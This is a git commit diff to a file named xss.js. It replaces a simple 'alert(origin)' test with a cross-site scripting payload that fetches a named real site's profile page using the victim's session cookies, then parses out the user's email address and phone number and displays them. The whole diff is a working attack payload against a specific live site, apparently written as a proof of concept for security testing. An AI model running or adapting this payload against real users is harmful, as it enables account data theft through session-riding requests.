04d86580c1e611b79e605df4a09007c1c3153e61
zinc000 <140118579+zinc000@users.noreply.github.com>
2025-08-02 20:17:27 +0300

    xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,12 @@
-alert(origin)
+fetch("https://www.profound.com/Pages/Subscriptions/ProfileManagement.aspx?view=Profile", {
+  credentials: "include"
+})
+.then(response => response.text())
+.then(html => {
+    let parser = new DOMParser();
+    let doc = parser.parseFromString(html, "text/html");
+    let email = doc.querySelector("#BodyArea_MainContentArea_radEmailAddress_text")?.value || "Not found";
+    let phone = doc.querySelector("#BodyArea_MainContentArea_radPhone_text")?.value || "Not found";
+
+    alert("Email: " + email + "\nPhone: " + phone);
+});
